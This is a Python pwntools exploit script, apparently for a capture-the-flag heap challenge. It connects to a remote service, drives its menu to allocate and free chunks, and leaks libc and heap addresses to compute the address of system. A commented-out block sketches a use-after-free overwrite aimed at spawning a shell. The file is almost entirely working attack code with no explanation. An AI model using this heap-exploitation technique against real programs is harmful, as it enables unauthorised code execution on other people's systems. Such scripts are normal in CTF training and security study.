from pwn import *

p = process('./share/chal')
p = remote('10.113.184.121', 10057)

def register(idx):
    p.recvuntil(b'choice: ')
    p.send(b'1\x00')
    p.recvuntil(b'Index: ')
    p.send(str(idx).encode() + b'\x00')
    
def delete(idx):
    p.recvuntil(b'choice: ')
    p.send(b'2\x00')
    p.recvuntil(b'Index: ')
    p.send(str(idx).encode() + b'\x00')
    
def set_name(idx, length, name):
    p.recvuntil(b'choice: ')
    p.send(b'3\x00')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode() + b'\x00')
    p.recvuntil(b'Length: ')
    p.sendline(str(length).encode() + b'\x00')
    p.recvuntil(b'Name: ')
    p.send(name)
    
def trigger_event(idx):
    p.recvuntil(b'choice: ')
    p.send(b'4\x00')
    p.recvuntil(b'Index: ')
    p.send(str(idx).encode() + b'\x00')
    
p.recvuntil(b'gift1: ')
system = int(p.recvline().strip(), 16)
print('system: ', hex(system))
p.recvuntil(b'gift2: ')
heap_leak = int(p.recvline().strip(), 16)
print('heap_leak: ', hex(heap_leak))
# sh_addr = heap_leak + 0x60
# register(0)
# register(1)
# set_name(1, 0x10, b'sh\x00')
# delete(0)
# set_name(1, 0x18, p64(0) + p64(sh_addr) + p64(system))
for i in range(0x9):
    register(i)
    set_name(i, 0x88, b'a')
    
for i in range(0x9):
    delete(i)
    
for i in range(0x8):
    register(i)
    set_name(i, 0x88, b'a')

trigger_event(7)
p.recvuntil(b'Name: ')
result = u64(p.recvline(1)[:-1].ljust(8, b'\x00'))
print(hex(result))
libc_base = result - 0x1ecb61
system_addr = libc_base + 0x52290
print("libc_base: " + hex(libc_base))
print("system_addr: " + hex(system_addr))
raw_input()
# trigger_event(0)
p.interactive()
